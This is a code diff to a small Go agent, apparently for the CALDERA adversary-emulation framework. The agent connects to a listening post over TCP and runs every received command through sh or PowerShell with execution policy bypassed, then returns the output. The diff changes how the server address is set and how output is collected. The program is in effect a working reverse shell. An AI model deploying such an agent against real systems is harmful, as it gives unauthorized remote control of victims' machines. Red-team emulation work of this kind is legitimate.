@@ -10,14 +10,14 @@ import (
    "os/user"
    "time"
    "runtime"
+   "flag"
 )
 
-// Execute runs a shell command
 func execute(command string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).CombinedOutput()
-	} 
-	return exec.Command("sh", "-c", command).CombinedOutput()
+		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
+   } 
+	return exec.Command("sh", "-c", command).Output()
 }
 
 func push(conn net.Conn) {
@@ -33,14 +33,12 @@ func push(conn net.Conn) {
          pieces := strings.Split(message, "cd")
          os.Chdir(strings.TrimSpace(pieces[1]))
          conn.Write([]byte(" "))
-      } else if (strings.HasPrefix(message, "pid")) {
-         conn.Write([]byte(string(os.Getpid())))
       } else {
          output, err := execute(message)
          if err != nil {
             conn.Write([]byte(string(err.Error())))
          }
-         conn.Write([]byte(output))
+         conn.Write([]byte(fmt.Sprintf("%s%s", output, "\n")))
       }
    }
 }
@@ -50,12 +48,11 @@ func main() {
    user, _ := user.Current()
    paw := fmt.Sprintf("%s$%s", host, user.Username)
 
-   server := "127.0.0.1:5678"
-   if len(os.Args) == 2 {
-      server = os.Args[1]
-   }
+	server := flag.String("server", "127.0.0.1:5678", "The IP of CALDERA listening post")
+   flag.Parse()
+   
    for {
-      conn, err := net.Dial("tcp", server)
+      conn, err := net.Dial("tcp", *server)
       if err != nil {
          fmt.Println(err)
          time.Sleep(5 * time.Second)
